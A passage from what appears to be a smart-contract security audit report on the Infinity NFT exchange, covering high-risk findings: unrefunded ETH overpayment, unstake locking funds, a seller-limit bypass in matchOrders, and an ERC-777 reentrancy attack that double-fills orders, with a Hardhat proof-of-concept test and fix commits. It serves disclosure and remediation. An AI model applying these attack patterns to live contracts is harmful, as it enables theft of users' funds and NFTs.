+In the case of a Dutch or reverse Dutch auction priced in native ETH, the end user is likely to send more ETH than the final calculated price in order to ensure their transaction succeeds, since price is a function ofblock.timestamp, and the user cannot predict the timestamp at which their transaction will be included.
+In a Dutch auction, final price may decrease below the calculated price at the time the transaction is sent. In a reverse Dutch auction, the price may increase above the calculated price by the time a transaction is included, so the buyer is incentivized to provide additional ETH in case the price rises while their transaction is waiting for inclusion.
+ThetakeOrdersandtakeMultipleOneOrdersfunctions both check that the buyer has provided an ETH amount greater than or equal to the total price at the time of execution:
+InfinityExchange#takeOrders
+// check to ensure that for ETH orders, enough ETH is sent// for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sentif(isMakerSeller&&currency==address(0)) {require(msg.value>=totalPrice,'invalid total price');}
+InfinityExchange#takeMultipleOneOrders
+// check to ensure that for ETH orders, enough ETH is sent// for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sentif(isMakerSeller&&currency==address(0)) {require(msg.value>=totalPrice,'invalid total price');}
+However, neither of these functions refunds the user in the case of overpayment. Instead, overpayment amounts will accrue in the contract balance.
+Moreover, since there is a bug inrescueETHthat prevents ether withdrawals fromInfinityExchange, these overpayments will be locked permanently: the owner cannot withdraw and refund overpayments manually.
+Scenario:
+Alice creates a sell order for her token with constraints that set up a reverse Dutch auction: start price500, end price2000, start time1, end time5.Bob fills the order at time2. The calculated price is875. Bob is unsure when his transaction will be included, so provides a full2000wei payment.Bob’s transaction is included at time3. The calculated price is1250.Bob’s additional750wei are locked in the contract and not refunded.
+Suggestion: Calculate and refund overpayment amounts to callers.
+nneverlander (Infinity) confirmed and resolved:
+Agree with the assessment, fixed inhttps://github.com/infinitydotxyz/exchange-contracts-v2/commit/a605b72e44256aee76d80ae1652e5c98c855ffd3
+HardlyDifficult (judge) commented:
+In the case of a Dutch auction, precise pricing is unknown at the time a tx is broadcasted. This leads to users overpaying and the surplus is taken as exchange fees instead of being refunded.Accepting as a High risk submission.
+
+[H-09] Callingunstake()can cause locked funds
+Submitted by Ruhum, also found by 0xDjango, auditor0517, dipp, GimelSec, GreyArt, p4st13r4, and wagmi
+Following scenario:
+Alice has staked X token for 6 months that have vested. She stakes Y tokens for another three months. If she now callsunstake(X)to take out the tokens that have vested, the Y tokens she staked for three months will be locked up.
+Proof of Concept
+First, here’s a test showcasing the issue:
+describe('should cause trouble', ()=>{it('should lock up funds',asyncfunction() {awaitapproveERC20(signer1.address,token.address,amountStaked,signer1,infinityStaker.address);awaitinfinityStaker.connect(signer1).stake(amountStaked,2);awaitnetwork.provider.send("evm_increaseTime", [181*DAY]);awaitnetwork.provider.send('evm_mine', []);// The funds we staked for 6 months have vestedexpect(awaitinfinityStaker.getUserTotalVested(signer1.address)).to.eq(amountStaked);// Now we want to stake funds for three monthsawaitapproveERC20(signer1.address,token.address,amountStaked2,signer1,infinityStaker.address);awaitinfinityStaker.connect(signer1).stake(amountStaked2,1);// total staked is now the funds staked for three & six months// total vested stays the sameexpect(awaitinfinityStaker.getUserTotalStaked(signer1.address)).to.eq(amountStaked.add(amountStaked2));expect(awaitinfinityStaker.getUserTotalVested(signer1.address)).to.eq(amountStaked);// we unstake the funds that are already vested.constuserBalanceBefore=awaittoken.balanceOf(signer1.address);awaitinfinityStaker.connect(signer1).unstake(amountStaked);constuserBalanceAfter=awaittoken.balanceOf(signer1.address);expect(userBalanceAfter).to.eq(userBalanceBefore.add(amountStaked));expect(awaitinfinityStaker.getUserTotalStaked(signer1.address)).to.eq(ethers.BigNumber.from(0));expect(awaitinfinityStaker.getUserTotalVested(signer1.address)).to.eq(ethers.BigNumber.from(0));});});
+The test implements the scenario I’ve described above. In the end, the user got back theiramountStakedtokens with theamountStaked2tokens being locked up in the contract. The user has no tokens staked at the end.
+The issue is in the_updateUserStakedAmounts()function:
+if(amount>noVesting) {userstakedAmounts[user][Duration.NONE].amount=0;userstakedAmounts[user][Duration.NONE].timestamp=0;amount=amount-noVesting;if(amount>vestedThreeMonths) {// MAIN ISSUE:// here `vestedThreeMonths` is 0. The current staked tokens are set to `0` and `amount` is decreased by `0`.// Since `vestedThreeMonths` is `0` we shouldn't decrease `userstakedAmounts` at all here.userstakedAmounts[user][Duration.THREE_MONTHS].amount=0;userstakedAmounts[user][Duration.THREE_MONTHS].timestamp=0;amount=amount-vestedThreeMonths;// `amount == vestedSixMonths` so we enter the else blockif(amount>vestedSixMonths) {userstakedAmounts[user][Duration.SIX_MONTHS].amount=0;userstakedAmounts[user][Duration.SIX_MONTHS].timestamp=0;amount=amount-vestedSixMonths;if(amount>vestedTwelveMonths) {userstakedAmounts[user][Duration.TWELVE_MONTHS].amount=0;userstakedAmounts[user][Duration.TWELVE_MONTHS].timestamp=0;}else{userstakedAmounts[user][Duration.TWELVE_MONTHS].amount-=amount;}}else{// the staked amount is set to `0`.userstakedAmounts[user][Duration.SIX_MONTHS].amount-=amount;}}else{userstakedAmounts[user][Duration.THREE_MONTHS].amount-=amount;}}else{userstakedAmounts[user][Duration.NONE].amount-=amount;}
+Recommended Mitigation Steps
+Don’t setuserstakedAmounts.amountto0if none of its tokens are removed (vestedAmount == 0)
+nneverlander (Infinity) confirmed
+HardlyDifficult (judge) commented:
+When unstaking, unvested tokens may become locked in the contract forever.Accepting this as a High risk issue.
+
+[H-10] Sellers may lose NFTs when orders are matched withmatchOrders()
+Submitted by KIntern, also found by csanuragjain, GimelSec, kenzo, and unforgiven
+FunctionmatchOrdersuses custom constraints to make the matching more flexible, allow seller/buyer to specify maximum/minimum number of NFTs they want to sell/buy. This function first does some checks and then execute matching.
+But infunctionareNumItemsValid(), there is a wrong checking will lead to wrong logic inmatchOrders()function.
+Instead of checking ifnumConstructedItems <= sell.constraints[0]or not, functionareNumItemsValid()check ifbuy.constraints[0] <= sell.constraints[0]. It will lead to the scenario thatnumConstructedItems > sell.constraints[0]and make the seller sell more number of nfts than he/she allow.
+Proof of Concept
+Consider the scenario
+Alice create a sell order to sell maximum 2 in her 3 BAYC with ids[1, 2, 3]Bob create a buy order to buy mimimum any 2 BAYC with id in list[1, 2, 3]Match executor callmatchOrders()to match Alice’s order and Bob’s one with parameterconstructs = [1, 2, 3]FunctionmatchOrderswill transfer all NFT inconstructlist (3 NFTs1, 2, 3) from seller to buyer even though seller only want to sell maximum 2 NFTs.
+For more information, please check this PoC.https://gist.github.com/minhquanym/a95c8652de8431c5d1d24aa4076a1878
+Tools Used
+Hardhat, Chai
+Recommended Mitigation Steps
+Replace checkbuy.constraints[0] <= sell.constraints[0]withnumConstructedItems <= sell.constraints[0]
+nneverlander (Infinity) confirmed
+HardlyDifficult (judge) commented:
+Seller’s may specify a max number of NFTs to sell, but in the scenario outlined by the warden that requirement is not enforced - leading to the sale of more NFTs than authorized.Accepting this as a High risk report.
+
+[H-11] Reentrancy frommatchOneToManyOrders
+Submitted by kenzo, also found by 0xDjango
+https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L178
+https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L216
+https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L230
+Vulnerability Details
+matchOneToManyOrdersdoesn’t conform to Checks-Effects-Interactions pattern, and updates the maker order nonce only after the NFTs and payment have been sent.
+Using this, a malicious user can re-enter the contract and re-fulfill the order usingtakeOrders.
+Impact
+Orders can be executed twice. User funds would be lost.
+Proof of Concept
+matchOneToManyOrderswill set the order nonce as used only after the tokens are being sent:
+function matchOneToManyOrders(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.MakerOrder[] calldata manyMakerOrders) external {...if (makerOrder.isSellOrder) {for (uint256 i = 0; i < ordersLength; ) {..._matchOneMakerSellToManyMakerBuys(...); // @audit will transfer tokens in here...}//@audit setting nonce to be used only hereisUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;} else {for (uint256 i = 0; i < ordersLength; ) {protocolFee += _matchOneMakerBuyToManyMakerSells(...); // @audit will transfer tokens in here...}//@audit setting nonce to be used only hereisUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;...}
+So we can see that tokens are being transferred before nonce is being set to executed.
+Therefore, POC for an attack -
+Alice wants to buy 2 unspecified WolfNFT, and she will pay via AMP, an ERC-777 token.
+Malicious user Bob will set up an offer to sell 2 WolfNFT.
+The MATCH_EXECUTOR will match the offers.
+Bob will set up a contract such that upon receiving of AMP, it will calltakeOrderswith Alice’s order, and 2 other WolfNFTs.
+(Note that althoughtakeOrdersisnonReentrant,matchOneToManyOrdersis not, and so the reentrancy will succeed.)
+So intakeOrders, the contract will match Alice’s order with Bob’s NFTs, and then set Alice’s order’s nonce to true, thenmatchOneToManyOrdersexecution will resume, and again will set Alice’s order’s nonce to true.
+Alice ended up buying 4 WolfNFTs although she only signed an order for 2. Tough luck, Alice.
+(Note: a similar attack can be constructed via ERC721’s onERC721Received.)
+Recommended Mitigation Steps
+Conform to CEI and set the nonce to true before executing external calls.
+nneverlander (Infinity) confirmed and resolved:
+Fixed in:https://github.com/infinitydotxyz/exchange-contracts-v2/commit/b90e746fa7af13037e7300b58df46457a026c1ac
+HardlyDifficult (judge) commented:
+Great catch! Agree with the assessment.
+
